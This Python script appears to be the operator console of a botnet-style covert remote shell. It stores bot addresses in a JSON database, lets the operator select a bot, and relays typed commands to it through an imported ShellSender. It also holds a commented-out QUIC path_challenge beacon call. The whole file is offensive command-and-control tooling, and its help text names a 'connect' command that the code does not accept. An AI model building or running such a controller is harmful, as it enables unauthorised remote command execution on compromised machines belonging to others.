#!/usr/bin/env python3

import os
import json
import asyncio
import argparse
from tabulate import tabulate

from lib.beacon import transmit_beacon
from lib.shell_sender import ShellSender


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="QUIC remote shell")

    parser.add_argument("-burst",
                        type=int,
                        default=1,
                        help="number of path_challenges to send at once")

    parser.add_argument("-burst_timeout",
                        type=int,
                        default=5,
                        help="timeout between each path_challenge burst")

    args = parser.parse_args()
    return args


class NetInfo(object):
    indent = 1

    bot_database_path = "connection_data/database.json"

    def __init__(self, **kwargs):
        self.bot_list = self.__read_json_database()

    def __read_json_database(self):
        if not os.path.isfile(self.bot_database_path):
            return {}

        with open(self.bot_database_path, mode="r") as json_file:
            database = json.load(json_file)
            return database

    def update_database(self, bot_name: str, id: str, addr: str, port: int):
        self.bot_list[bot_name] = {"id": id, "addr": addr, "port": port}

        with open(self.bot_database_path, mode="w") as json_file:
            json.dump(self.bot_list, json_file, indent=self.indent)
        pass

    def add_bot(self):
        bot_name = input("bot_name: ")
        id = input("id: ")
        addr = input("addr: ")
        port = int(input("port: "))
        self.update_database(bot_name, id, addr, port)

    def get_bot_info(self, bot_name: str) -> dict:
        if bot_name not in self.bot_list.keys():
            print(f"The name {bot_name} doesn't exist in the database")
            return None
        return self.bot_list[bot_name]

    def show_list(self):
        print("| {:^20} | {:^20} | {:^20} | {:^20} |".format(
            "name", "id", "addr", "port"))
        print("|{0}+{0}+{0}+{0}|".format("-" * 22))
        for bot_name, info in self.bot_list.items():
            print("| {:^20} | {:^20} | {:^20} | {:^20} |".format(bot_name,
                                                                 info["id"],
                                                                 info["addr"],
                                                                 info["port"]))


class CommandParser(object):

    help = [
        "a, add     -   add new bot info to shell database",
        "l, list    -   list all possible bot to communicate with",
        "c, connect -   select bot to connect, example: c \"bot_name\"",
        "h, help    -   show this help menu"
    ]

    def __init__(self, net_info: NetInfo, burst, timeout):
        self.net_info = net_info
        self.selected_bot_info: dict = None
        self.shell_sender: ShellSender = None
        self.burst = burst
        self.timeout = timeout

    async def process(self, cmd: str) -> None:
        if cmd in ["a", "add"]:
            self.net_info.add_bot()
        elif cmd in ["l", "list"]:
            self.net_info.show_list()
        elif cmd.split(' ')[0] in ["s", "select"]:
            await self.select_bot(cmd)
        elif cmd in ["h", "help"]:
            self.help_command()
        else:
            output = await self.send_command(cmd)
            print(output)

    async def select_bot(self, cmd: str):
        if len(cmd.split(' ')) == 2:
            self.selected_bot_info = self.net_info.get_bot_info(
                cmd.split(' ')[1])
            self.shell_sender = ShellSender(
                self.selected_bot_info["addr"], self.selected_bot_info["port"])
            print(f"Connecting to {self.selected_bot_info}")
            # TODO: need to check on docker
            #await transmit_beacon((self.selected_bot_info["addr"], self.selected_bot_info["port"]),
            #                      self.selected_bot_info["id"].encode(), burst=self.burst, timeout=self.timeout)

        else:
            self.help_command()

    async def send_command(self, cmd: str) -> str:
        if self.shell_sender is None:
            print("Please select a bot to control")
            return ""
        return await self.shell_sender.send_command(cmd)

    @classmethod
    def help_command(cls) -> None:
        print("help:\n-----")
        for line in cls.help:
            print(line)


def main() -> None:
    args = parse_args()
    net_info = NetInfo(**vars(args))
    command_parser = CommandParser(net_info, args.burst, args.burst_timeout)
    try:
        while True:
            command = input(">")

            asyncio.run(command_parser.process(command))

    except KeyboardInterrupt:
        print("\ngoodbye...")


if __name__ == "__main__":
    main()
